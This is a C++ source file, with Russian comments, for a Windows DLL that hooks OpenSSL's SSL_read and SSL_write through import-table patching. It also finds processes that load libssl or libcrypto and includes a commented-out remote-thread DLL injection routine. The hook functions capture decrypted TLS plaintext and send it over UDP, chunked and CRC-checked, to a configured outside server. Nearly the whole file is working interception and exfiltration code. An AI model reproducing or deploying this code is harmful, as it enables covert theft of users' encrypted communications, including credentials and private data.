#include "pch.h"
#include "dll_injector.hpp"

#include "zlib.h"

#pragma warning(disable:4996)

using std::wstring;
using std::make_pair;
using std::cout;
using std::cerr;
using std::endl;
using std::pair;
using std::vector;
using std::string;

DWORD64 SSL_read_addr;
DWORD64 SSL_write_addr;


// Заменяет адреса в таблице импорта
DECLSPECPP int Inject()
{
    HANDLE hProcess = GetCurrentProcess();
    // Находим модуль в котором определены нужные функции SSL_read, SSL_write
    HMODULE hTargetModule;
    FindModule(&hTargetModule);

    // Получаем адрес функции, которую мы хотим заменить
    FARPROC pOriginalSslRead = GetProcAddress(hTargetModule, "SSL_read"),
        pOriginalSslWrite = GetProcAddress(hTargetModule, "SSL_write");

    // Получаем адрес своей функции
    FARPROC pReplacementRead = reinterpret_cast<FARPROC>(&My_SSL_read),
        pReplacementWrite = reinterpret_cast<FARPROC>(&My_SSL_write);

    // Получаем информацию о модуле
    IMAGE_IMPORT_DESCRIPTOR* pImportDesc = nullptr;
    pImportDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(ImageDirectoryEntryToData(hTargetModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, nullptr));

    // Перебираем импортируемые модули
    while (pImportDesc->Name) 
    {
        const char* pszName = reinterpret_cast<const char*>(hTargetModule + pImportDesc->Name);

        // Перебираем импортируемые функции
        IMAGE_THUNK_DATA* pThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(hTargetModule + pImportDesc->FirstThunk);
        while (pThunk->u1.Function) 
        {
            FARPROC* ppfn = reinterpret_cast<FARPROC*>(&pThunk->u1.Function);
            if (*ppfn == pOriginalSslRead)
            {
                DWORD oldProtect;
                VirtualProtect(ppfn, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);

                // Заменяем адрес функции на адрес своей функции
                *ppfn = pReplacementRead;

                VirtualProtect(ppfn, sizeof(FARPROC), oldProtect, &oldProtect);
            }
            else if (*ppfn == pOriginalSslWrite)
            {
                DWORD oldProtect;
                VirtualProtect(ppfn, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);

                // Заменяем адрес функции на адрес своей функции
                *ppfn = pReplacementWrite;

                VirtualProtect(ppfn, sizeof(FARPROC), oldProtect, &oldProtect);
            }
            ++pThunk;
        }
        ++pImportDesc;
    }
    return 0;
}

DECLSPECPP int FindModule(HMODULE *hModuleDll)
{
    vector<wstring> all_modules;
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (EnumProcessModules(GetCurrentProcess(), hMods, sizeof(hMods), &cbNeeded)) 
    {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) 
        {
            TCHAR szModName[MAX_PATH];
            if (GetModuleFileNameEx(GetCurrentProcess(), hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                try
                {
                    all_modules.push_back(wstring{ szModName });
                }
                catch (std::exception& ex)
                {
                    cout << "ERROR PUSH err:" << ex.what() << endl;
                }
            }
        }
    }

    // Ищем нужный модуль
    for (const std::wstring& moduleName : all_modules) 
    {
        HMODULE hModule = GetModuleHandle(moduleName.c_str());
        if (hModule) 
        {
            DWORD size;
            PIMAGE_EXPORT_DIRECTORY exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
                ImageDirectoryEntryToData(hModule, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &size)
                );

            if (exports) 
            {
                DWORD* functions = reinterpret_cast<DWORD*>(hModule + exports->AddressOfFunctions);
                WORD* ordinals = reinterpret_cast<WORD*>(hModule + exports->AddressOfNameOrdinals);
                DWORD* names = reinterpret_cast<DWORD*>(hModule + exports->AddressOfNames);

                for (DWORD i = 0; i < exports->NumberOfFunctions; i++) 
                {
                    char* functionNamePtr = reinterpret_cast<char*>(hModule + names[i]);
                    if (strcmp(functionNamePtr, "SSL_read") == 0) 
                    {
                        *hModuleDll = hModule;
                        std::wcout << L"Exported function " << "SSL_read" << L" found in module " << moduleName << std::endl;
                        break;
                    }
                }
            }
        }
    }
    return 0;
}

DECLSPECPP std::vector<std::pair<HANDLE, DWORD64>> FindOpensslProcesses()
{
    std::vector<std::pair<HANDLE, DWORD64>> ssl_process;
    DWORD processes[1024], bytes_needed;

    if (!EnumProcesses(processes, sizeof(processes), &bytes_needed))
    {
        cout << "Error in EnumProcess :: " << GetLastError();
        return ssl_process;
    }

    DWORD num_processes = bytes_needed / sizeof(DWORD);

    for (DWORD i = 0; i < num_processes; i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);

        if (hProcess)
        {
            HMODULE hMods[1024];
            DWORD cbNeeded;

            if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
            {
                for (DWORD j = 0; j < (cbNeeded / sizeof(HMODULE)); j++)
                {
                    char moduleName[MAX_PATH];
                    if (GetModuleBaseNameA(hProcess, hMods[j], moduleName, sizeof(moduleName)))
                    {
                        if (strstr(moduleName, "libssl") != NULL || strstr(moduleName, "libcrypto") != NULL)
                        {
                            ssl_process.push_back(make_pair(hProcess, processes[i]));
                            break;
                        }
                    }
                }
            }
        }

        CloseHandle(hProcess);
    }

    return ssl_process;
}

//DECLSPEC int Load(HANDLE hProcess)
//{
//    wstring dllPath = L"DllInject";
//    // Получение адреса функции LoadLibraryW в удаленном процессе
//    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
//    FARPROC pfnLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
//    if (!pfnLoadLibraryW)
//        return -1;
//
//    // Аллоцирование памяти в удаленном процессе для строки с именем DLL
//    size_t dllPathLen = wcslen(dllPath.c_str()) * sizeof(wchar_t);
//    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
//    if (!remoteDllPath)
//        return -1;
//
//    // Запись имени DLL в аллоцированную память
//    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath.c_str(), dllPathLen, NULL)) 
//    {
//        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
//        return -1;
//    }
//
//    // Создание удаленного потока, вызывающего LoadLibraryW с именем DLL
//    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
//        reinterpret_cast<LPTHREAD_START_ROUTINE>(pfnLoadLibraryW), remoteDllPath, 0, NULL);
//
//    if (!hRemoteThread) 
//    {
//        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
//        return -1;
//    }
//
//    // Ожидание завершения удаленного потока
//    WaitForSingleObject(hRemoteThread, INFINITE);
//
//    // Освобождение ресурсов
//    CloseHandle(hRemoteThread);
//    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
//}


// Перехватывающая функция
// Отправляет перехваченный буфер серверу по сети
DECLSPEC int My_SSL_read(DWORD* ssl, void* buf, int num)
{
    // Вызываем оригинальнную функцию SSL_read
    int (*originalSSLRead)(DWORD*, void*, int) = reinterpret_cast<int(*)(DWORD*, void*, int)>(SSL_read_addr);
    int result = originalSSLRead(ssl, buf, num);

    WSADATA wsa_data;
    SOCKET _socket;
    sockaddr_in server_address;
    // Инициализируем структуру сокетов
    // Инициализация Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        cerr << "Ошибка при инициализации Winsock." << endl;
        return INVALID_SOCKET;
    }

    // Создание UDP сокета
    _socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (_socket == INVALID_SOCKET)
    {
        std::cerr << "Не удалось создать UDP сокет." << std::endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Задание адреса сервера
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(DEFAULT_PORT);
    server_address.sin_addr.s_addr = inet_addr(DEFAULT_IP);

    inet_pton(AF_INET, DEFAULT_IP, &(server_address.sin_addr));


    // ========= Отправляем буфер серверу ===========
    string data(static_cast<char*>(buf));

    int total_bytes_send = 0, bytes_to_sent, bytes_sent;
    // Sending the data size
    bytes_to_sent = htonl(data.size());
    bytes_sent = sendto(_socket, reinterpret_cast<char*>(&bytes_to_sent), sizeof(bytes_to_sent), 0, (struct sockaddr*)&server_address, sizeof(server_address));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    // Sending data in blocks
    while (total_bytes_send < data.size())
    {
        bytes_to_sent = min(data.size() - total_bytes_send, BUFFER_SIZE);
        bytes_sent = sendto(_socket, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&server_address, sizeof(server_address));
        if (bytes_sent == SOCKET_ERROR)
        {
            cerr << "Ошибка отправки данных." << endl;
            return -1;
        }

        total_bytes_send += bytes_sent;
    }

    // Sending a checksum of data
    unsigned checksum = GetCRC32(data);
    checksum = htonl(checksum);
    bytes_sent = sendto(_socket, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&server_address, sizeof(server_address));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    return result;
}

DECLSPEC int My_SSL_write(DWORD* ssl, const void* buf, int num)
{
    WSADATA wsa_data;
    SOCKET _socket;
    sockaddr_in server_address;
    // Инициализируем структуру сокетов
    // Инициализация Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        cerr << "Ошибка при инициализации Winsock." << endl;
        return INVALID_SOCKET;
    }

    // Создание UDP сокета
    _socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (_socket == INVALID_SOCKET)
    {
        std::cerr << "Не удалось создать UDP сокет." << std::endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Задание адреса сервера
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(DEFAULT_PORT);
    server_address.sin_addr.s_addr = inet_addr(DEFAULT_IP);

    inet_pton(AF_INET, DEFAULT_IP, &(server_address.sin_addr));


    // ========= Отправляем буфер серверу ===========
    string data(static_cast<const char*>(buf));

    int total_bytes_send = 0, bytes_to_sent, bytes_sent;
    // Sending the data size
    bytes_to_sent = htonl(data.size());
    bytes_sent = sendto(_socket, reinterpret_cast<char*>(&bytes_to_sent), sizeof(bytes_to_sent), 0, (struct sockaddr*)&server_address, sizeof(server_address));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    // Sending data in blocks
    while (total_bytes_send < data.size())
    {
        bytes_to_sent = min(data.size() - total_bytes_send, BUFFER_SIZE);
        bytes_sent = sendto(_socket, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&server_address, sizeof(server_address));
        if (bytes_sent == SOCKET_ERROR)
        {
            cerr << "Ошибка отправки данных." << endl;
            return -1;
        }

        total_bytes_send += bytes_sent;
    }

    // Sending a checksum of data
    unsigned checksum = GetCRC32(data);
    checksum = htonl(checksum);
    bytes_sent = sendto(_socket, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&server_address, sizeof(server_address));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    // Вызываем оригинальнную функцию SSL_read
    int (*originalSSLRead)(DWORD*, const void*, int) = reinterpret_cast<int(*)(DWORD*, const void*, int)>(SSL_write_addr);
    return originalSSLRead(ssl, buf, num);
}

DECLSPECPP unsigned GetCRC32(std::string data)
{
    // Инициализация CRC32
    unsigned int crc = crc32(0L, Z_NULL, 0);

    // Вычисление CRC32 для строки
    crc = crc32(crc, reinterpret_cast<const Bytef*>(data.c_str()), data.length());

    return crc;
}